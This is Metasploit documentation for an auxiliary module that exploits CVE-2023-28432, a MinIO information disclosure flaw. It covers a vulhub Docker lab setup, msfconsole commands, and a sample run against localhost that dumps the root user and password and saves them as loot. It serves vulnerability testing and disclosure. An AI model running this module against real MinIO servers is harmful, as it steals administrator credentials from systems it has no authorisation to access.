## Vulnerable Application

MinIO is a Multi-Cloud Object Storage framework. In a cluster deployment starting with
RELEASE.2019-12-17T23-16-33Z and prior to RELEASE.2023-03-20T20-16-18Z, MinIO returns
all environment variables, including `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD`,
resulting in information disclosure.

### Docker Image

1. Download docker yml: https://raw.githubusercontent.com/vulhub/vulhub/master/minio/CVE-2023-28432/docker-compose.yml
1. Execute `docker-compose up` inside the same directory containing the docker-compose.yml
1. Then MinIO's login page should be available at http://127.0.0.1:9001/

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/gather/minio_bootstrap_verify_info_disc.rb`
1. Do: `set rhost [IP]`
1. Do: `run`
1. You should get MinIO Environmental Variables

## Options

## Scenarios

### MinIO 2023-02-27T18:10:45Z from docker image

```
resource (msf)> set rhost 127.0.0.1
rhost => 127.0.0.1
resource (msf)> set rport 9000
rport => 9000
msf6 auxiliary(gather/minio_bootstrap_verify_info_disc) > run
[*] Reloading module...
[*] Running module against 127.0.0.1

[+] MINIO_ACCESS_KEY_FILE: access_key
[+] MINIO_CONFIG_ENV_FILE: config.env
[+] MINIO_KMS_SECRET_KEY_FILE: kms_master_key
[+] MINIO_ROOT_PASSWORD: minioadmin-vulhub
[+] MINIO_ROOT_PASSWORD_FILE: secret_key
[+] MINIO_ROOT_USER: minioadmin
[+] MINIO_ROOT_USER_FILE: access_key
[+] MINIO_SECRET_KEY_FILE: secret_key
[+] MinIO Environmental Variables Json Saved to: /root/.msf4/loot/20240131112953_default_127.0.0.1_minio.env.json_772811.json
[*] Auxiliary module execution completed
```